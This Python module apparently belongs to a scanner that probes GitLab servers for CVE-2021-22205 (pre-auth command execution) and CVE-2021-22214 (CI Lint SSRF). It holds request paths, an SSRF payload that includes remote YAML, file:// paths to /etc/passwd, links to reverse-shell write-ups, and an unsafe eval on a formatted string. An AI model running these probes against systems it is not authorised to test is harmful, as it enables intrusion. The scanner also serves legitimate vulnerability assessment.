#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''

    Gitlab扫描类: 
        1. GitLab Pre-Auth 远程命令执行 
            CVE-2021-22205
                Payload: https://vulhub.org/#/environments/gitlab/CVE-2021-22205/
                反弹shell: https://blog.csdn.net/weixin_46137328/article/details/121551162

        2. Gitlab CI Lint API未授权 SSRF
            CVE-2021-22214
                Payload: https://cloud.tencent.com/developer/article/1851527


file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
file:///C:/Windows/System32/drivers/etc/hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.thread import thread
from thirdparty import requests
from payloads.Gitlab.cve_2021_22205 import cve_2021_22205_scan
from payloads.Gitlab.cve_2021_22214 import cve_2021_22214_scan

class Gitlab():
    def __init__(self):
        self.session = requests.session()
        
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Gitlab'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2021_22205_payloads = [
            {
                'path': 'users/sign_in',
                'data': ''
            },
            {
                'path': 'uploads/user',
                'data': ''
            },
            {
                'path': 'sign_in',
                'data': ''
            },
            {
                'path': 'user',
                'data': ''
            }
        ]
        
        self.cve_2021_22214_payloads = [
            {
                'path': 'api/v4/ci/lint',
                'data': '{ "include_merged_yaml": true, "content": "include:\\n  remote: http://DNSdomain/api/v1/targets/?test.yml"}'
            },
        ]

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2021_22205_scan, url=url),
            thread(target=self.cve_2021_22214_scan, url=url)
        ]

Gitlab.cve_2021_22205_scan = cve_2021_22205_scan
Gitlab.cve_2021_22214_scan = cve_2021_22214_scan

gitlab = Gitlab()
